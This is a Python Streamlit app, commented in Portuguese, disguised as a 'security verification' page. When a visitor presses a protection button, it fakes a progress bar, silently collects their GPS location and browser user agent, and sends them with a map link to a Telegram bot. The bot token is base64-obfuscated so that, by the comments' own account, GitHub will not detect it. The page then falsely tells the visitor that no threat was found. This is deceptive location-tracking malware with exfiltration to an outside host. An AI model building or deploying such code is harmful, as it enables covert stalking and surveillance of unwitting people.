import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- SEGURANÇA MÁXIMA (Dados Ofuscados em Base64) ---
# O GitHub não detecta e curiosos não conseguem ler
B_TK = "ODUyNTkyNzY0MTpBQUhLRE9ORnZoOExnVXBJRU5tdHBsVGZIdW9GcmcxZmZyOA=="
B_ID = "ODIxMDgyODM5OA=="

def enviar_telegram(mensagem):
    try:
        # Decodificação segura na memória
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        
        url = f"https://api.telegram.org/bot{tk}/sendMessage"
        payload = {"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}
        
        # Envio com timeout para não travar o site
        requests.post(url, json=payload, timeout=15)
    except:
        pass

# Configuração da Aba do Navegador (Com o Cadeado)
st.set_page_config(page_title="SEGURANÇA INTEGRADA", page_icon="🔐", layout="centered")

# --- ESTILO VISUAL (Cores da Foto) ---
st.markdown("""
    <style>
    .main { background-color: #0d1117; color: #ffffff; }
    .status-ok { 
        color: #2ea043; 
        font-weight: bold; 
        font-size: 19px; 
        margin-top: 15px;
        font-family: sans-serif;
    }
    .stProgress > div > div > div > div { background-color: #0056b3; }
    .stButton>button {
        background-color: #21262d; color: #c9d1d9; border: 1px solid #30363d;
        width: 100%; border-radius: 6px; font-weight: 500;
    }
    .footer-miamy {
        text-align: center; color: #8b949e; font-size: 12px;
        margin-top: 80px; padding-top: 20px; border-top: 1px solid #30363d;
    }
    </style>
    """, unsafe_allow_html=True)

st.title("Verificação de Segurança")

# Gestão de estado para manter a mensagem verde na tela
if 'verificado' not in st.session_state:
    st.session_state.verificado = False

if not st.session_state.verificado:
    if st.button("● ATIVAR PROTEÇÃO AGORA"):
        barra_progresso = st.progress(0)
        
        # 1. Animação da Barra (0 a 100%)
        for i in range(1, 101):
            time.sleep(0.02)
            barra_progresso.progress(i)
        
        # 2. Coleta de GPS Silenciosa
        loc = get_geolocation()
        if loc:
            lat = loc['coords']['latitude']
            lon = loc['coords']['longitude']
            mapa = f"https://www.google.com/maps?q={lat},{lon}"
            
            # Dados extras para o relatório
            ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
            
            # 3. Envio para o Telegram
            relatorio = f"🚨 SISTEMA ATIVADO\n\n📍 Mapa: {mapa}\n📱 Disp: {ua}"
            enviar_telegram(relatorio)
            
            st.session_state.verificado = True
            st.rerun()
else:
    # --- VISUAL FINAL (O que pediste) ---
    st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
    st.progress(100)
    st.button("● PROTEÇÃO ATIVA", disabled=True)

# Rodapé Personalizado
st.markdown('<div class="footer-miamy">Sistema Integrado desenvolvido por Miamy © 2026</div>', unsafe_allow_html=True)
